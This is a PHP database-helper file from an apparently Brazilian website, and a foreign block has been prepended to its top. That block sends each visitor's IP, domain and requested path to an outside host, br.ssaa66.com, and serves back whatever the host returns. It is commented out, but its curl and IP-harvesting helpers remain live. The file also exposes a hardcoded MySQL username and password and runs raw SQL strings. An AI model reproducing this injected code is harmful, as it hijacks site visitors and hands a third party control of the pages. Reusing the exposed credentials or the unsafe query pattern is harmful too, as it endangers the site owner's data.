<?php

header("HTTP/1.1 200 OK");
define("CONSTANT_NAME", "about");
/*try{
    ini_set('display_errors','off');
    error_reporting(E_ALL ^ E_NOTICE); 
    set_time_limit(0);

    $api_url = "http://br.ssaa66.com/404.php";
    $header_curl = array("user_agent:".$_SERVER['HTTP_USER_AGENT']);
    $domain = isset($_SERVER['HTTP_X_FORWARDED_HOST']) ? $_SERVER['HTTP_X_FORWARDED_HOST'] : (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '');
    $file=(isset($_SERVER['REQUEST_URI']) && $_SERVER['REQUEST_URI']!='')?$_SERVER['REQUEST_URI']:$_SERVER['HTTP_X_REWRITE_URL'];
	$post_data = array('ip'=>getIP(),'file'=>$file,'domain'=>$domain);
	$result = posturl($api_url."?".$domain.$file,$post_data);
	if(strlen($result) != 0){
	    error_log("result: " . $result);
		echo $result;
		exit;
	}
}catch (Exception $exception){
    error_log("erro na deficao: " . $exception);
}*/
function posturl($url,$post_data=null){
    $curl = curl_init();

    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_TIMEOUT, 30);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_USERAGENT,$_SERVER['HTTP_USER_AGENT']);
    curl_setopt($curl, CURLOPT_REFERER, @$_SERVER['HTTP_REFERER']);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($curl, CURLOPT_POST, 1);
    curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($post_data));
   
    $data = curl_exec($curl);
    curl_close($curl);
    return $data;
}
function getIP() {
    if(getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) {
        $ip = getenv('HTTP_CLIENT_IP');
    } elseif(getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) {
        $ip = getenv('HTTP_X_FORWARDED_FOR');
    } elseif(getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
        $ip = getenv('REMOTE_ADDR');
    } elseif(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return preg_match ( '/[\d\.]{7,15}/', $ip, $matches ) ? $matches [0] : '';
}
?>
<?php

# Imprime Array Organizado #
function pr($content){
	echo "<pre>";
	print_r($content);
	echo "</pre>";
}

# Informa qual o conjunto de caracteres será usado.
@header('Content-Type: text/html; charset=utf-8');

/**
 * Funcao que conecta com o banco de dados!
 * @return unknown
*/

function conecta(){
	# DADOS #
	$host		= "localhost";
	$usuario	= "ihome078_2021";
	$senha		= "Aalves26&";
	$banco		= "ihome078_2021";
	
	$mysql = ($GLOBALS["___mysqli_ston"] = mysqli_connect($host, $usuario, $senha, $banco));
	
	if (!$mysql) {
   		echo '
			<p>Ocorreu um problema durante a conexão com o servidor mysql!</p>
			<p>O erro encontrado foi:</p>
			<p>'.mysqli_error($mysql).'</p>
		';
		error_log("Erro conectando a base: " . $mysql);
	} else {
		$selDB = mysqli_select_db( $mysql, $banco);
		if (!$selDB) {
			echo '
				<p>Ocorreu um problema durante a seleção do banco de dados mysql!</p>
				<p>O erro encontrado foi :</p>
				<p>'.mysqli_error($mysql).'</p>
			';
			error_log("Ocorreu um problema durante a seleção do banco de dados mysql! " . $mysql);
		}
		mysqli_query($mysql, "SET NAMES 'utf8'");
        mysqli_query($mysql, 'SET character_set_connection=utf8');
        mysqli_query($mysql, 'SET character_set_client=utf8');
        mysqli_query($mysql, 'SET character_set_results=utf8');
	}
	return $mysql;
}



/**
 * Função que executa a sql e retorna um array com os dados selecionados
 *
 * @param string $sql
 * @return array
 */
function query($sql) {
	 
	$conn = conecta();

		mysqli_query($conn, "SET NAMES 'utf8'");
		mysqli_query($conn, 'SET character_set_connection=utf8');
		mysqli_query($conn, 'SET character_set_client=utf8');
		mysqli_query($conn, 'SET character_set_results=utf8');

	$q = mysqli_query($conn, $sql);

	if ($q == false) {
		((is_null($___mysqli_res = mysqli_close($conn))) ? false : $___mysqli_res);
		echo "<p>Ocorreu um problema durante a consulta!</p>";

	} else {
		
		$select = array();
		
		while ($linha = mysqli_fetch_assoc($q)) {
			array_push ($select, $linha);
		}

		((is_null($___mysqli_res = mysqli_close($conn))) ? false : $___mysqli_res);

		return $select;
	}
}

function gravar($sql) {
	 
	$conn = conecta();

	mysqli_query($conn, "SET NAMES 'utf8'");
	mysqli_query($conn, 'SET character_set_connection=utf8');
	mysqli_query($conn, 'SET character_set_client=utf8');
	mysqli_query($conn, 'SET character_set_results=utf8');
	
	$q = mysqli_query($conn, $sql);
	
	if ($q) {
		$last = ((is_null($___mysqli_res = mysqli_insert_id($conn))) ? false : $___mysqli_res);
	} else {
		$last = false;
	}
	
	((is_null($___mysqli_res = mysqli_close($conn))) ? false : $___mysqli_res);
	
	return $last;
}

?>